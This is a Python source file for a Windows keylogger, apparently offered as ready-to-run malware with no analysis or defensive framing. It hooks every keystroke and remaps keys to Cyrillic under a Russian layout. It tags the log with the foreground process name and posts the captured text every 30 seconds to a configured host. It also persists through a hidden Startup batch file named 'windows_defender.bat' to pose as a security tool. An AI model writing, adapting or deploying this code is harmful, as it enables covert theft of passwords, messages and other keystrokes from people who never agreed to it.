from time import sleep
from keyboard import KEY_DOWN, hook
from psutil import process_iter
from ctypes import windll, byref, wintypes
from win32api import GetKeyboardLayout
from requests import post
from sys import executable, argv
from subprocess import call
from os import getenv, path

HOST = "https://127.0.0.1:5555"

class Keylogger:
    def __init__(self):
        self.log = ""
        self.layout_map = {**{k: v for k, v in zip("qwertyuiop[]asdfghjkl;'zxcvbnm,./`", "йцукенгшщзхфывапролджэячсмитьбюё")},
                           **{k.upper(): v.upper() for k, v in zip("qwertyuiop[]asdfghjkl;'zxcvbnm,./`", "ЙЦУКЕНГШЩЗХФЫВАПРОЛДЖЭЯЧСМИТЬБЮЁ")}}

    def get_keyboard_layout(self):
        hwnd = windll.user32.GetForegroundWindow()
        thread_id = windll.user32.GetWindowThreadProcessId(hwnd, None)
        return GetKeyboardLayout(thread_id) & 0xFFFF

    def is_russian_layout(self):
        return self.get_keyboard_layout() == 0x0419

    def get_active_process(self):
        pid = wintypes.DWORD()
        windll.user32.GetWindowThreadProcessId(windll.user32.GetForegroundWindow(), byref(pid))
        for item in process_iter():
            if pid.value == item.pid:
                return item.name()
        return None

    def callback(self, event):
        if event.event_type == KEY_DOWN:
            name = self.layout_map.get(event.name, event.name)
            if name == "space": name = " "
            elif name == "enter": name = " [ENTER] "
            elif len(name) > 1: name = f"[{name.replace(' ', '_').upper()}]"
            self.log += name.replace("\n", "")

    def send_tg(self, log):
        try:
            post(HOST + "/send_log", json={"log": log})
        except:
            pass

    def add_startup(self):
        startup_folder = path.join(getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup")
        bat_path = path.join(startup_folder, "windows_defender.bat")
        with open(bat_path, "w") as bat_file:
            bat_file.write(f'@echo off\nstart "" "{executable}"\n')
        call(['attrib', '+h', bat_path])

    def start(self):
        self.add_startup()
        hook(self.callback)
        while True:
            sleep(30)
            active_process = self.get_active_process()
            self.log = f"\n[{active_process}]\n\n" + self.log
            if self.log:
                self.send_tg(self.log)
                self.log = ""

keylogger = Keylogger()
keylogger.start()